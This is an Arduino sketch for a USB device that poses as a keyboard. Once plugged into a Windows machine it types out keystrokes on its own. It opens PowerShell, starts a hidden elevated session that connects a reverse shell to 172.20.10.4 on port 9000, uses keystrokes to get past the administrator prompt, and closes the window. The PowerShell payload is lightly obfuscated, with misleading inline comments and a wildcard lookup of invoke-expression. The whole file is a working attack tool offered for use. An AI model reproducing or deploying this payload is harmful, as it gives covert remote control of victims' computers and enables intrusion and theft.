//highlight here
#include <Keyboard.h>

void setup() {
  delay(1000);
  Keyboard.begin();
}

void loop() {
  static boolean copiedFlag = false;
  if(!copiedFlag){
    copiedFlag = true;

    Keyboard.press(KEY_LEFT_GUI); //left cmd
    delay(100);
    Keyboard.write('r');
    delay(100);
    Keyboard.releaseAll();
    delay(1000);

    Keyboard.print("powershell");
    delay(100);
    Keyboard.write(0xB0);
    delay(2000);

    Keyboard.print("Start-Process $PSHOME/powershell.exe -Verb RunAs -ArgumentList {$7d3 = New-Object <# hello world , TCPClient is connect #>   System.Net.Sockets.TCPClient('172.20.10.4',9000); <# Streaming pwd xie ibe asoe iex vbase #>$cc7 = $7d3.GetStream();[byte[]]$2d3 = 0..65535|%{0};while(($i = $cc7.Read($2d3, 0, $2d3.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($2d3,0, $i);$4c7 = (&(gcm invok*-exp*) $data 2>&1 | Out-String );$back2 = $4c7 + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($back2);$cc7.Write($sendbyte,0,$sendbyte.Length);$cc7.Flush()};$7d3.Close()} -WindowStyle Hidden");
    delay(1000);
    Keyboard.write(0xB0);
    delay(1000);

    Keyboard.write(0xD8);
    delay(300);
    Keyboard.write(0xB0);
    delay(500);


    Keyboard.print("exit");
    delay(10);
    Keyboard.write(0xB0);
    delay(10);
    
  }
  
}
